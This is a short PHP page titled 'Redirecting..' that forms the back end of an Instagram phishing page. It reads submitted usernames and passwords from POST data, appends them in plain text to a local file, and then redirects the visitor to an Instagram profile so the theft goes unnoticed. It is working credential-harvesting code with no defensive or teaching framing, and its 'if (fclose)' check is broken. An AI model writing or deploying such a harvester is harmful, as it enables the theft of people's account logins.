<!DOCTYPE html>
<html>
<head>
	<title>Redirecting..</title>
</head>
<body>
<?php

$myfile = fopen("newfile.txt", "a") or die("Unable to open file!");
$username = $_POST["username"];
fwrite($myfile, $username);
$password = $_POST["password"];
fwrite($myfile, ' : ');
fwrite($myfile, $password);
$text="||\n";
fwrite($myfile, $text);

fclose($myfile);
if (fclose){
	//You need to redirect
	header("Location: https://www.instagram.com/username/");
	exit();
   }
  else{
	header("Location: https://www.instagram.com/username/");
  }

?>

</body>
</html>